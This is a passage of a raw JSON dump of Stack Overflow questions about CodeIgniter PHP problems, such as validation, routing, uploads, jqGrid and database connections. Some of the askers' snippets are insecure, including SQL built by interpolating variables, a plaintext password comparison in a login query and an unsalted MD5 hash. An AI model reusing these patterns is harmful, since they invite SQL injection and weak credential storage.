list.</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('password', 'lang:user.password', 'trim|required|min_length[6]|max_length[12]|matches[password_confirm]');\n</code></pre>\n\n<p>I want to be able to show a message if the field is empty like \"Some fields are missing\". But I want to show a specific message if the user only write a password shorther than 6 characters or higher than 12 like \"The password length must be between 6 and 12 characters\"</p>\n\n<p>Thx.</p>\n"},{"tags":["apache","codeigniter","mint"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13036941,"title":"codeigniter project migration from iis to apache2","body":"<p>I have migrated my project from Windows IIS to Mint Apache2.\nUnfortunately I am getting an error:</p>\n\n<pre><code>HTTP Error 500 (Internal Server Error): An unexpected condition was encountered while the server was attempting to fulfil the request.\n</code></pre>\n\n<p>I have changed permissions on the files to 755. Normally if there is a CI error (connecting to db etc) it throws an error.</p>\n\n<p>I have opened my index.php with VI, and I have noticed ^M on the end of each line in EACH FILE. This doesn't show in Aptana though. \n<img src=\"http://i.stack.imgur.com/cKCsM.jpg\" alt=\"Strange endings on the end of each line\"></p>\n\n<p>I have spent last half a year writing this app and I'm not very excited about this.\nDoes anybody have any experience with this?</p>\n\n<p>Thank you.</p>\n"},{"tags":["php","mysql","codeigniter","stored-procedures"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":13047263,"title":"get value from stored procedure in php","body":"<p>This is my SP:</p>\n\n<pre><code>DELIMITER $$\n\nCREATE DEFINER=FUNCTION `test`(p_begin varchar(10),p_end varchar(10),p_code varchar(2)) RETURNS varchar(10) CHARSET latin1\nBEGIN\n    DECLARE V_ADA VARCHAR(8);\n    DECLARE V_LAST VARCHAR(8);\n    DECLARE V_NIK  VARCHAR(8);\n\n    select NIK INTO V_NIK from absen where join_date &gt;= p_begin and join_date&lt;= p_end AND company_id=p_code ORDER BY NIK DESC LIMIT 1 ;\n\n    SET V_NIK=V_NIK+1;\n    return V_NIK;\nEND\n</code></pre>\n\n<p>I am trying to get the return value with php:</p>\n\n<pre><code>$query=$this-&gt;db-&gt;query(\"select test(\\\"$begin\\\",\\\"$end\\\", \\\"$code\\\")\")-&gt;result();\n\n    var_dump($query);\n    die;\n</code></pre>\n\n<p>The result is:</p>\n\n<pre><code>array(1) { [0]=&gt; object(stdClass)#20 (1) { [\"test(\"2007-01-01\",\"2007-12-31\", \"1\")\"]=&gt; string(7) \"118\" } } \n</code></pre>\n\n<p>My problem is that I want to get the value from stored procedure (\"118\") and I don't know how to change the object into a string.</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":55,"score":-2,"question_id":13046603,"title":"how to get individual values from this array","body":"<p>I got this result when I printed the array print_r($post); </p>\n\n<pre><code>Array ( [0] =&gt; Array ( [0] =&gt; stdClass Object ( [subscriber_id] =&gt; 80010055 [cto_id] =&gt; [name] =&gt; n [mobile] =&gt; 1234564444 [state] =&gt; [city] =&gt; fsd [cto_subscriber_id] =&gt; 0 [password] =&gt; e10adc3949ba59abbe56e057f20f883e [email] =&gt; n@n.com [email_verified] =&gt; 1 [ip_address] =&gt; ::1 [last_login_time] =&gt; 2012-10-24 11:37:19 ) ) [1] =&gt; Array ( [0] =&gt; stdClass Object ( [subscriber_id] =&gt; 80010055 [ip_address] =&gt; [landline_number] =&gt; [sex] =&gt; 0 [dob] =&gt; 0000-00-00 00:00:00 [marital_status] =&gt; hfg [state] =&gt; [addres] =&gt; fgh [city] =&gt; fghfg [pincode] =&gt; fghfgh ) ) ) \n</code></pre>\n\n<p>How can I get single values</p>\n"},{"tags":["php","codeigniter","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12803789,"title":"How to set the filename, but the file extension while uploading files in CodeIgniter","body":"<p><code>$config['file_name']</code> allows us to set the filename, while uploading files in CodeIgniter. Here we need to write the filename with the file extension. For example, <code>filename.pdf</code> or <code>filename.zip</code>. I want to set the filename, but the extension. So, if someone uploads a pdf file, the filename will be <code>myfilename.pdf</code>. And if someone uploads a zip file, the filename will be <code>myfilename.zip</code>.</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13042986,"title":"URL Rewriting in codeigniter rewrite the URL for next page after login","body":"<p>I'm having a hardtime on this part. Well I created a login page using codeigniter wherein the whole path would be <code>http://localhost/CodeIgniter_2.1.3/index.php</code> will be rewritten into <code>http://localhost/login</code> using .htaccess. Well it works just fine but the problem is after I made a successful login and the page redirects to next page using redirect('next_page'); since the URL would be <code>http://localhost/CodeIgniter_2.1.3/index.php/next_page</code> instead of <code>http://localhost/next_page</code>. I also created a rewriterule for that part :</p>\n\n<pre><code>RewriteRule ^events$ /CodeIgniter_2.1.3/index.php/events [L,NC]\n</code></pre>\n\n<p>and whenever I key in the <code>http://localhost/next_page</code> in the addressbar the page would appear just fine (since I haven't applied any rules on login and on this page.) I also tried using redirect('http://localhost/events'); this also works just fine but still I know this is not the real solution for this. Oh by the way my .htaccess exists on the www folder of wampserver. Any way to solve this?</p>\n"},{"tags":["php","codeigniter","migration"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12966990,"title":"CodeIgniter White Screen after migrating from DSO to FCGI","body":"<p>I've encountered a problem where codeigniter returns a whitescreen to me.</p>\n\n<p>Note: this was working fine when I was still in DSO.\nNote: I have tried changing the value of $config['uri_protocol']</p>\n\n<p>Consider this example:</p>\n\n<pre><code>url&gt; mysite.com/process/something/321\noutput&gt; **** WHITESCREEN ****\n\nurl&gt; mysite.com/process/something/321/2323\noutput&gt; you have entered: 321\n\nurl&gt; mysite.com/process/something/323/2asdfshdf\noutput&gt; you have entered: 323\n\nurl&gt; mysite.com/process/something/323\noutput&gt; **** WHITESCREEN ****\n</code></pre>\n\n<p>code:</p>\n\n<pre><code>class process extends Controller{\n  public function something($digit){\n    die(\"you have entered: \" . $digit);\n  }\n}\n</code></pre>\n\n<p>what do I need to do to get rid of the whitescreen?</p>\n"},{"tags":["codeigniter","hook"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":12956273,"title":"precontroller hooks in codeigniter","body":"<p>I am using pre-controller hook codeigniter in my project</p>\n\n<p>Description:\n  we are using subdomain concept and three templates(theme). eg: My site is xyz.com. this is having one first template.</p>\n\n<p>some business signup with this xyz site. for eg. abc(business). We create abc.xyz.com. abc chooses 2 template.  abc.xyz.com in browser need to show 2nd template. It is not showing 2nd template. it is showing only 1st template. </p>\n\n<p>When we clicked any link on the site more than once , then the template 2 is set for abc.xyz.com link.</p>\n\n<p>I am using codeigniter. loaded session, database in autoload files. </p>\n\n<p>I used precontroller hook to check whether the url is xyz or any subdomain abc.xyz.com\nIn hook i am setting template if the url is subdomain one.</p>\n\n<p>But template is not showing when abc.xyz.com is in browser. when i refresh the url for some clicks or clicked any of the header link some count , it showing the actual template of the business abc.</p>\n\n<p>Please help me to fix this issue or provide me some solution .</p>\n\n<pre><code>&lt;?php\nclass Subdomain_check extends CI_Controller{\npublic function __construct(){\n    parent::__construct();\n    $this-&gt;CI =&amp; get_instance();\n\n    if (!isset($this-&gt;CI-&gt;session))\n    {\n    $this-&gt;CI-&gt;load-&gt;library('session');\n    }\n\n}\nfunction checking()\n{\n\n$subdomain_arr = explode('.', $_SERVER['HTTP_HOST']); //creates the various parts\n\nif($subdomain_arr[0] == 'www')\n{\n    $subdomain_name = $subdomain_arr[1]; //2ND Part            \n}\nelse\n{\n    $subdomain_name = $subdomain_arr[0]; // FIRST Part                      \n}        \n\nheader (\"Expires: Mon, 26 Jul 1997 05:00:00 GMT\");   \nheader (\"Last-Modified: \" . gmdate(\"D, d M Y H:i:s\") . \" GMT\");\nheader (\"Cache-Control: no-cache, must-revalidate\");\nheader (\"Pragma: no-cache\"); \n\nif( $subdomain_name != 'xyz' )\n{\n    $where = array();\n    $where['subdomain_name'] = $subdomain_name;\n    $where['status'] = 1;\n    $this-&gt;db-&gt;from('subdomain_map');\n    $this-&gt;db-&gt;where($where); \n    $query = $this-&gt;db-&gt;get();         \n    if($query-&gt;num_rows() &lt; 1)\n    {\n    header('Location:http://xyz.com/index.php?/error');\n    }   \n    else\n    {\n    $result = $query-&gt;row_array();\n    $this-&gt;CI-&gt;session-&gt;set_userdata('subdomain_id',$result['subdomain_id']);\n    $this-&gt;CI-&gt;session-&gt;set_userdata('subdomain_name',$result['subdomain_name']);\n    $org_id = gat_organisationid_using_subdomainid($result['subdomain_id']);\n    $this-&gt;CI-&gt;session-&gt;set_userdata('organisation_id', $org_id);\n\n    if($org_id)\n    {\n    $templ_id = get_templid_using_organisationid($org_id);\n    $org_logo = get_organisation_logo($org_id);\n    }  \n\n    if($templ_id){\n    if($this-&gt;session-&gt;userdata('pinlogin'))\n    $this-&gt;CI-&gt;session-&gt;set_userdata('template_set', 4);\n    else\n    $this-&gt;CI-&gt;session-&gt;set_userdata('template_set', $templ_id);               \n    }\n\n    if($org_logo)\n    $this-&gt;CI-&gt;session-&gt;set_userdata('org_logo', $org_logo);              \n    }           \n}\nelse\n{\n    $this-&gt;CI-&gt;session-&gt;unset_userdata('subdomain_id');\n    $this-&gt;CI-&gt;session-&gt;unset_userdata('subdomain_name');\n    if( $this-&gt;CI-&gt;session-&gt;userdata('user_id') &amp;&amp; $this-&gt;CI-&gt;session-&gt;userdata('user_category')&lt;=2 )\n    {\n    $this-&gt;CI-&gt;session-&gt;unset_userdata('organisation_id');\n    $this-&gt;CI-&gt;session-&gt;unset_userdata('org_logo');\n    }\n}    \n}\n</code></pre>\n\n<p>}</p>\n"},{"tags":["php","codeigniter","expressionengine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12709843,"title":"Expression Engine Members Fields - Show All Field Types","body":"<p>Hi I am trying to add an upload field and a radio button field for our members in EE2 but when adding a custom member field you only have a choice of text input, text area, or drop down <a href=\"http://expressionengine.com/user_guide/cp/members/custom_member_fields_edit.html#field-type\" rel=\"nofollow\">http://expressionengine.com/user_guide/cp/members/custom_member_fields_edit.html#field-type</a></p>\n\n<p>Is there anyway to have access to all of the field types in EE for custom members fields?</p>\n"},{"tags":["forms","codeigniter","url"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":8954983,"title":"Best way of adding aditional values to form get url","body":"<p>I was wondering, which is the best way to add additional values to an url created by a form with a GET method... the url looks something like</p>\n\n<p><code>http://testing.com/results?search_query=landscape&amp;search_filter[]=mountain</code></p>\n\n<p>I'll have on the results page additional filters and paging system, and I was wondering which is the best way of adding the values of those once chosen/selected <strong>to the url</strong>? So if clicked on next button it will add a <code>&amp;page=X</code> to the url or/and a <code>&amp;sort_by=top_rate</code></p>\n"},{"tags":["php","codeigniter","php-5.3"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13021336,"title":"Codeigniter - Allowed memory size exhausted while uploading","body":"<p>I noticed there are similar questions but I have tried the proposed solutions and could not come up with a solution.</p>\n\n<p>Here is my development environment:</p>\n\n<ul>\n<li>PHP 5.3.10-1ubuntu3.4 with Suhosin-Patch (cli) </li>\n<li>Server version: Apache/2.2.22 (Ubuntu)</li>\n<li>Codeigniter_2.1.2</li>\n</ul>\n\n<p>What I'm trying to do is the basic example of the image upload. Here is the controller:</p>\n\n<pre><code>&lt;?php\n\nclass Entry extends CI_Controller {\n\n    function __construct() {\n        parent::__construct();\n        ini_set('memory_limit', \"256M\");\n    }\n\n    function index() {\n        $this-&gt;load-&gt;view('upload_form');\n    }\n\n    function upload() {\n\n        $config['upload_path'] = './uploads/';\n        $config['allowed_types'] = 'gif|png|jpg';\n        $config['max_size'] = 2048;\n        $config['max_width'] = 1024;\n        $config['max_height'] = 768;\n\n        $this-&gt;load-&gt;library('upload', $config);\n\n        if (! $this-&gt;upload()-&gt;do_upload('file')) {\n            $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n            $this-&gt;load-&gt;view('upload_form', $error);\n        }\n    }\n\n}\n\n?&gt;\n</code></pre>\n\n<p>And my view file is simply like this:</p>\n\n<pre><code>&lt;?php\n    echo form_open_multipart('entry/upload');\n    echo form_upload('file');\n    echo form_submit('submit', 'Upload Fille');\n?&gt;\n</code></pre>\n\n<p>In the controller, you can see that I've tried setting memory limit to 256MB, I also tried the -1 option. When I set the memory_limit to -1 the computer ran crazy, it froze ((:</p>\n\n<p>Here is the error that I'm getting when I try to upload sth.</p>\n\n<pre><code>PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 523800 bytes) in /var/www/giydir/system/core/Common.php on line 358, referer: http://localhost/giydir/entry\n</code></pre>\n\n<p>The line that the error shows is interesting to me</p>\n\n<pre><code>$_log =&amp; load_class('Log');\n</code></pre>\n\n<p>Do anyone have an idea for possible reasons or solution methods?</p>\n\n<p>Best regards</p>\n"},{"tags":["php","codeigniter","post"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":184,"score":1,"question_id":12376251,"title":"Codeigniter $this->input->post() empty while $_POST is working correctly","body":"<p>On a codeigniter installation, I am trying to use the inbuilt <code>$this-&gt;input-&gt;post('some_data')</code> function, however <code>$this-&gt;input-&gt;post()</code> is an empty array.</p>\n\n<p>A <code>print_r($_POST)</code> gives all the variables fully and correctly?</p>\n\n<p>According to the codeigniter docs, The input class \"is initialized automatically by the system so there is no need to do it manually\", leaving me wondering what else I'm meant to do.</p>\n\n<p>Any thoughts on how I should try to get this working?</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","codeigniter","mod-rewrite","post"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12904521,"title":"How do I get the $_POST method to work on subdomain with CodeIgniter?","body":"<p>As my title says, the $ _POST method won't work correctly on my CodeIgniter installation. The values do not follow through when posting a form.</p>\n\n<p><strong>Strange thing 1:</strong>\nIt works great on my \"non-subdomain\" site that has the <strong>exact same codes</strong>.</p>\n\n<p><strong>Strange thing 2:</strong>\nIt works when adding \"/index.php/\" in the path. But still, I haven't done that on my other site. But I use .htaccess on both sites, and even those files look exactly like. Here is the code:</p>\n\n<pre><code>#php_value default_charset UTF-8\n\nRewriteEngine on\n\nRewriteCond $1 !^(index\\.php|assets|img|swf|xml|robots\\.txt|css|js|favicon.ico|robots.txt|404.html)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>So, how do I get the form post working correctly on a CodeIgniter installation on a subdomain?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12702234,"title":"codeigniter image upload watermark and thumbnail","body":"<p>i am uploading an image using CI upload library work fine, problem with watermarking and image thumbnail, if id do watermarking first and then thumbnail, its doing watermarking to original image but also re-sized it thumbnail size but not keeping original size image with watermark too, if i do thumbnail first then watermark it work fine but i want thumbnail also watermarked here is my code</p>\n\n<pre><code>$this-&gt;do_thumb('file_name');\n$this-&gt;watermark('file_name');\n\nfunction watermark($filename){\n        $image_cfg = array();\n        $image_cfg['image_library'] = 'GD2';\n        $image_cfg['source_image'] = 'upload/' . $filename;\n        $image_cfg['wm_overlay_path'] = 'upload/watermark.png';\n        $image_cfg['new_image'] = 'upload/mark_'.$filename;\n        $image_cfg['wm_type'] = 'overlay';\n        $image_cfg['wm_opacity'] = '10';\n        $image_cfg['wm_vrt_alignment'] = 'bottom';\n        $image_cfg['wm_hor_alignment'] = 'right';\n        $image_cfg['create_thumb'] = FALSE;\n\n        $this-&gt;image_lib-&gt;initialize($image_cfg);\n        $this-&gt;image_lib-&gt;watermark();\n        $this-&gt;image_lib-&gt;clear();\n\n//        echo $this-&gt;image_lib-&gt;display_errors();\n//        die();\n\n    }\n\n    function do_thumb($filename) {\n        $image_cfg['image_library'] = 'GD2';\n        $image_cfg['source_image'] = 'upload/' . $filename;\n        $image_cfg['create_thumb'] = TRUE;\n        $image_cfg['maintain_ratio'] = TRUE;\n        $image_cfg['width'] = '200';\n        $image_cfg['height'] = '175';\n        $this-&gt;load-&gt;library('image_lib');\n        $this-&gt;image_lib-&gt;initialize($image_cfg);\n        $this-&gt;image_lib-&gt;resize();\n        $this-&gt;image_lib-&gt;clear();\n    }\n</code></pre>\n"},{"tags":["codeigniter","routes"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12977572,"title":"removing a controller name from url","body":"<p>Am trying to remove a controller name in codeigniter form this, </p>\n\n<p><code>localhost/teekle/loggedin/info</code>. </p>\n\n<p>to </p>\n\n<p><code>localhost/teekle/info</code> </p>\n\n<p>I've tried the following code in my rooute.php file but nothing happened.</p>\n\n<p><code>$route['info'] = 'loggedin/info';</code></p>\n\n<p>But i just cant figure out a way to do so, can anyone help please?</p>\n"},{"tags":["php","jquery","codeigniter","jquery-plugins"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13037612,"title":"jqGrid errorTextFormat function","body":"<p>I´m developing an application using CodeIgniter and JQuery.\nI have read here <a href=\"http://stackoverflow.com/questions/8089061/jqgrid-error-message-on-delete\">jqgrid error message on delete</a> and here <a href=\"http://stackoverflow.com/questions/7816119/jqgrid-error-message-from-server-side-exception\">jqGrid error message from server side exception</a> some issues about this problem but the fact is that does not work for me. </p>\n\n<p>In my database I have set some business rules in form of index, checks, etc. I need to customize the \"error Status: 'error'. Error code: 500\" that the jqGrid returns when I have those types of errors.\nI´d appreciate any help. \nHere is my jquery grid code.</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    var base_url = 'http://localhost/sp/';\n    var site_url = 'http://localhost/sp/index.php';\n    var url = '';\n\n        $(document).ready(function() {\n\n           var grid = jQuery(\"#newapi_1351019084\").jqGrid({\n                    ajaxGridOptions : {type:\"POST\"},\n                       jsonReader : {\n                       root:\"data\",\n                       repeatitems: false\n                   },\n                   ondblClickRow: function(id){\n                       dtgLoadButton1();\n\n                        return;\n                       },\n                    rowList:[10,20,30],\n                    viewrecords: true\n                   ,url:'http://localhost/sp/index.php/assigment/getData'\n,editurl:'http://localhost/sp/index.php/assigment/setData'\n,datatype:'json'\n,rowNum:'13'\n,width:'800'\n,height:'300'\n,pager: '#pnewapi_1351019084'\n,caption:'Control de asignaciones'\n,colModel:[\n{name:'username',index:'username',label:'Usuario' ,align:'left',width:300,editable:false,edittype:'text',editrules:{required:true}  }\n,{name:'StoreName',index:'StoreName',label:'Tienda' ,align:'center',width:200,editable:false,edittype:'text',editrules:{required:true}  }\n,{name:'Users_idUsers',index:'Users_idUsers',label:'Usuario' ,align:'center',width:100,hidden:true,editable:true,edittype:'select',editoptions:{value:\":Select;5:tienda1;6:tienda2;17:tienda3;18:tienda11\",size:10},editrules:{edithidden:true,required:true,integer:true}  }\n,{name:'Stores_idStores',index:'Stores_idStores',label:'Tienda' ,align:'center',width:100,hidden:true,editable:true,edittype:'select',editoptions:{value:\":Select;1:EA001;3:EA003;4:EA005;5:EA006;6:EA007;7:EA008;8:EA009;9:EA010;10:EA011;11:EA012;12:EA013;13:EA015;14:EA017;15:EA018;16:EA019;17:EA020;18:EA021;19:EA022;20:EA002;21:EA000\",size:10},editrules:{edithidden:true,required:true,integer:true}  }\n,{name:'SurrugateTurn',index:'SurrugateTurn',label:'SurrugateTurn' ,align:'center',width:100,key:true,hidden:true,editable:true,edittype:'select',editoptions:{value:\":Select;1:1;3:3;2:2\",size:10},editrules:{hidden:true}  }\n]               })\n              jQuery(\"#newapi_1351019084\")\n            .jqGrid('navGrid',\n            '#pnewapi_1351019084',\n            {view:false,\n            edit:'1',\n            add:'1',\n            del:'1',\n            close:true,\n            delfunc: null ,\n            search:''\n        },\n        { recreateForm: true, \n        width : 400 ,\n        beforeShowForm : function(form) {\n\n         },\n        closeAfterEdit:true }, // edit options\n\n        {  recreateForm: true,\n        width : 400,\n        closeAfterAdd : true,\n         beforeSubmit : function(postdata, formid) {\n         var mensaje = '';\n         var resultado = true;\n\n\n\n\n          return[resultado,mensaje]; \n        }\n        }, /*add options*/\n\n        {mtype: 'POST'} /*delete options*/,\n        {sopt: ['eq','cn','ge','le' ] ,     \n        multipleSearch: false ,\n        showOnLoad : false,\n        overlay:false,mtype: 'POST'} /*search options*/\n        ).navButtonAdd('#pnewapi_1351019084',\n                { caption:'', buttonicon:'ui-icon-extlink', onClickButton:dtgOpenExportdata, position: 'last', title:'Export data', cursor: 'pointer'}\n                );\n;\n        });\n&lt;/script&gt;\n</code></pre>\n\n<p>Best regards and thanks for your time, </p>\n"},{"tags":["php","apache","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13032998,"title":"Very Long Running Script in CodeIgniter Slowing Dramatically After 90 Minutes","body":"<p>I have a very long running script that is doing a pretty significant amount of work with about 30 million database records. Every time I start it with the CLI and let it run, it runs fairly quickly given the amount of work it's doing (about 5k records/minute). However, after about 90 minutes of this, it slows down dramatically, taking 2 hours to complete 5k records. If I restart it, it runs fine again for about 90 minutes.</p>\n\n<p>The Apache log doesn't show anything for the time it slows down, and I'm just not sure where else to look.</p>\n\n<p>Running on the command line, PHP's max execution time shouldn't matter, and I've commented out the spot in CodeIngiter where it sets it to 300; I've even added a <code>set_time_limit(0)</code> to the top of the script.</p>\n\n<p>My database is PostgreSQL.</p>\n\n<p>Any suggestions on where to look?</p>\n\n<p>Edit: Ok, Definitely Seems to be a Memory Problem. But I'm using several arrays to cache results to do batch inserts and updates, but I am clearing them out after and they are used a ton of times before I hit the 90 minute mark. </p>\n\n<p>Is there a way to see what's currently in memory?</p>\n\n<p>Edit: I won't know if this is my solution for another 90 minutes, but If you're a CI user with Memory issues, check out this <a href=\"http://codeigniter.com/forums/viewthread/140012/#689396\" rel=\"nofollow\">http://codeigniter.com/forums/viewthread/140012/#689396</a></p>\n"},{"tags":["codeigniter","odbc","windows-authentication"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12963817,"title":"Connect Codeigniter to ODBC that uses Windows Authentication","body":"<p>I am looking for a solution that will allow me to connect to MS SQL through an ODBC that uses Windows Authentication. I have tested and verified all of the rest of the code by using a standard ODBC connection that requires a user/pass. Below are the settings that work with that ODBC and the settings I have tried on the Windows Authentication ODBC.</p>\n\n<p>Working database.php settings -standard user/pass connection</p>\n\n<pre><code>    $active_group = 'jf2';\n    $active_record = TRUE;\n    $db['jf']['hostname'] = 'system DSN name';\n    $db['jf']['username'] = 'db_user';\n    $db['jf']['password'] = 'db_pass';\n    $db['jf']['database'] = 'db_name';\n    $db['jf']['dbdriver'] = 'odbc';\n    $db['jf']['dbprefix'] = '';\n    $db['jf']['pconnect'] = TRUE;\n    $db['jf']['db_debug'] = TRUE;\n    $db['jf']['cache_on'] = FALSE;\n    $db['jf']['cachedir'] = '';\n    $db['jf']['char_set'] = 'utf8';\n    $db['jf']['dbcollat'] = 'utf8_general_ci';\n    $db['jf']['swap_pre'] = '';\n    $db['jf']['autoinit'] = TRUE;\n    $db['jf']['stricton'] = FALSE;           \n</code></pre>\n\n<p>non-working database.php settings - Windows Auth attempt</p>\n\n<pre><code>    $active_group = 'jf1';\n    $active_record = TRUE;\n\n    $db['jf1']['hostname'] = 'system DSN name';                \n    $db['jf1']['username'] = '';\n    $db['jf1']['password'] = '';\n    $db['jf1']['database'] = 'db_name';\n    $db['jf1']['dbdriver'] = 'odbc';\n    $db['jf1']['dbprefix'] = '';\n    $db['jf1']['pconnect'] = TRUE;\n    $db['jf1']['db_debug'] = TRUE;\n    $db['jf1']['cache_on'] = FALSE;\n    $db['jf1']['cachedir'] = '';\n    $db['jf1']['char_set'] = 'utf8';\n    $db['jf1']['dbcollat'] = 'utf8_general_ci';\n    $db['jf1']['swap_pre'] = '';\n    $db['jf1']['autoinit'] = TRUE;\n    $db['jf1']['stricton'] = FALSE;\n</code></pre>\n\n<p>Specifically, I am unsure what will go into the user/pass fields. The error is below:</p>\n\n<blockquote>\n  <p>A Database Error Occurred</p>\n  \n  <p>Unable to connect to your database server using the provided settings.</p>\n  \n  <p>Filename: C:\\wamp\\www\\CodeIgniter_2.1.2\\boss_table\\system\\database\\DB_driver.php</p>\n  \n  <p>Line Number: 124</p>\n</blockquote>\n\n<p>Thanks for your help.</p>\n"},{"tags":["php","jquery","html","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13034966,"title":"Ajax on multi check PHP Codeigniter","body":"<p>i want use ajax for sent to saveKrs and save to database. i'm use codeigniter, when i click submit button, there's no event. please help me</p>\n\n<pre><code>form_checkbox('checkKrs[]',$row-&gt;id, FALSE, 'id=checkKrs')\n\n\n      &lt;script type=\"text/javascript\"&gt;\n            $('#save_krs').click(function(){\n                 var id_student= $('#id_student').val();\n                 var id_semester = $('#id_semester').val();\n                    var checkKrs = new Array();\n                        $(\"input:checked\").each(function() {\n                           data['checkKrs[]'].push($(this).val());\n                        })\n\n                         var data = {\n                                checkKrs:checkKrs,\n                                id_semester:id_semester,\n                                id_mahasiswa:id_mahasiswa,\n                                is_ajax: '1'\n                            };\n\n                        $.ajax({\n                            url: \"saveKrs\",\n                            type: 'POST',\n                            data: data,\n                            beforeSend : fnLoadStart,\n                            complete : fnLoadStop,\n                            success: function(msg) {\n                                //$('#form_data').hide();\n                                $('#form_data').html(msg);\n                                //$('#report').show();\n                            }\n                        });\n                    alert('Pengisian KRS tidak boleh kosong');\n                    return false;\n            });\n\n    &lt;/script&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13034049,"title":"Callback email check","body":"<p>Trying to set-up a call back function, but it's not working for some reason. Not sure what I'm doing wrong here.</p>\n\n<p>Look for the registration() and _email_check($str) functions in the controller below.</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Register extends CI_Controller {\n\npublic function __construct() \n{\n    parent::__construct();\n    $this -&gt; load -&gt; model('user_model');\n}\n\npublic function index() \n{\n    if (($this -&gt; session -&gt; userdata('user_name') != \"\")) {\n        redirect('dashboard');\n    } \n    else\n    {\n        $data['title'] = 'Register';\n        $this -&gt; load -&gt; view('shared/header_view', $data);\n        $this -&gt; load -&gt; view(\"registration.php\", $data);\n        $this -&gt; load -&gt; view('shared/footer_view', $data);\n    }\n}\n\npublic function login() \n{\n    $email = $this -&gt; input -&gt; post('email');\n    $password = $this -&gt; input -&gt; post('pass');\n\n    $result = $this -&gt; user_model -&gt; login($email, $password);\n    if ($result)\n        redirect('dashboard');\n    else\n        $this -&gt; index();\n}\n\npublic function registration() \n{\n    $this -&gt; load -&gt; library('form_validation');\n    // field name, error message, validation rules\n    $this -&gt; form_validation -&gt; set_rules('user_name', 'User Name', 'trim|required|min_length[4]|xss_clean');\n    $this -&gt; form_validation -&gt; set_rules('email_address', 'Your Email', 'trim|required|valid_email', 'callback__email_check');\n    $this -&gt; form_validation -&gt; set_rules('password', 'Password', 'trim|required|min_length[4]|max_length[32]');\n    $this -&gt; form_validation -&gt; set_rules('con_password', 'Password Confirmation', 'trim|required|matches[password]');\n\n    if ($this -&gt; form_validation -&gt; run() == FALSE) \n    {\n        $this -&gt; index();\n    } \n    else \n    {\n        $this -&gt; user_model -&gt; add_user();\n\n        $email = $this -&gt; input -&gt; post('email');\n        $password = $this -&gt; input -&gt; post('pass');            \n\n        $result = $this -&gt; user_model -&gt; login($email, $password);\n        if ($result)\n        {\n            redirect('dashboard');  \n        }          \n    }        \n}\n\n// Checks that Email Address is not in use\npublic function _email_check($str)\n{\n    // return true if the address is indeed a new address\n    $this -&gt; db -&gt; where('email', $str);\n    $found = $this -&gt; db -&gt; get('user') -&gt; num_results(); // this returns the number of rows having the same address.\n\n    if ($found!=0)\n    {\n        $this -&gt; form_validation -&gt; set_message('email_check', 'Email Address is already in use');\n        return false;  // more than 0 rows found. the callback fails.\n    }\n    else\n    {\n        return true;   // 0 rows found. callback is ok.\n    }\n}\n\npublic function logout() \n{\n    $newdata = array('user_id' =&gt; '', 'user_name' =&gt; '', 'user_email' =&gt; '', 'logged_in' =&gt; FALSE, );\n    $this -&gt; session -&gt; unset_userdata($newdata);\n    $this -&gt; session -&gt; sess_destroy();\n    redirect(base_url());\n}\n}\n</code></pre>\n\n<p>Here's the MODEL in case you need it:</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass User_model extends CI_Model {\n\npublic function __construct() {\n    parent::__construct();\n}\n\nfunction login($email, $password) \n{\n    $this -&gt; db -&gt; where(\"email\", $email);\n    $this -&gt; db -&gt; where(\"password\", $password);\n\n    $query = $this -&gt; db -&gt; get(\"user\");\n    if ($query -&gt; num_rows() &gt; 0) \n    {\n        foreach ($query-&gt;result() as $rows) \n        {\n            //add all data to session\n            $newdata = array(\n                'user_id' =&gt; $rows -&gt; id,\n                'user_name' =&gt; $rows -&gt; username,\n                'user_email' =&gt; $rows -&gt; email,\n                'logged_in' =&gt; TRUE,\n            );\n        }\n        $this -&gt; session -&gt; set_userdata($newdata);\n        return true;\n    }\n    return false;\n}\n\npublic function add_user() \n{\n    $data = array(\n        'username' =&gt; $this -&gt; input -&gt; post('user_name'),\n        